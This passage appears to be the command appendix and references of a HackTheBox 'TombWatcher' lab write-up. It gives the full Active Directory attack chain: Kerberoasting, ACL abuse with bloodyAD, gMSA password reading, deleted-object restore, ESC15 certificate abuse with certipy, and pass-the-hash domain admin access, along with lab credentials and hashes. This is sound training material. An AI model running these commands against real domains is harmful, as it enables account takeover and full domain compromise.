```bash
# Reconnaissance
sudo nmap -p- 10.129.232.167 -sC -sV -Pn
echo "10.129.232.167 dc01.tombwatcher.htb tombwatcher.htb" | sudo tee -a /etc/hosts

# BloodHound collection
bloodhound-python -d tombwatcher.htb -dc dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -c All -ns 10.129.232.167 --dns-tcp --zip

# Targeted Kerberoast
sudo ntpdate 10.129.232.167
python3 targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --request-user alfred --dc-ip 10.129.232.167
hashcat -m 13100 alfred.hash rockyou.txt

# ACL chain — alfred
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupmember 'INFRASTRUCTURE' 'alfred'
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword

# ACL chain — ANSIBLE_DEV$
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'ANSIBLE_DEV$' -p :8d5363f881f1bb3bff9b0d64b8b76d7a set password sam 'rogue'

# ACL chain — sam -> john
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'rogue' set owner john sam
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'rogue' add genericAll john sam
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'rogue' set password john 'rogue'

# WinRM as john
evil-winrm -i dc01.tombwatcher.htb -u john -p rogue

# AD CS enumeration
certipy-ad find -target dc01.tombwatcher.htb -u john -p rogue

# AD Recycle Bin
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted | Where-Object { $_.isDeleted -eq $true }
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects -Properties *
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"

# Propagate FullControl + reset cert_admin password
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' TOMBWATCHER.HTB/john:'rogue'
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'john' -p 'rogue' set password cert_admin 'rogue'

# ESC15 exploitation
certipy-ad find -dc-host dc01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p 'rogue' -vulnerable -stdout
certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'rogue' -dc-ip 10.129.232.167 -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip 10.129.232.167
certipy req -u cert_admin -p 'rogue' -dc-ip 10.129.232.167 -target-ip 10.129.232.167 -ca tombwatcher-CA-1 -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx
certipy auth -dc-ip 10.129.232.167 -pfx administrator.pfx

# Domain Administrator access
evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
```

---

### E. References

- [MITRE ATT&CK — T1558.003 Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK — T1078.002 Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)
- [MITRE ATT&CK — T1098 Account Manipulation](https://attack.mitre.org/techniques/T1098/)
- [MITRE ATT&CK — T1649 Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
- [CVE-2024-49019 — Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019)
- [HackTheBox — TombWatcher](https://www.hackthebox.com/machines/tombwatcher)

> CVE-2024-49019 applies to this assessment (Finding 1 — ESC15). Findings 2, 3, and 4 are Active Directory misconfigurations with no associated CVE.
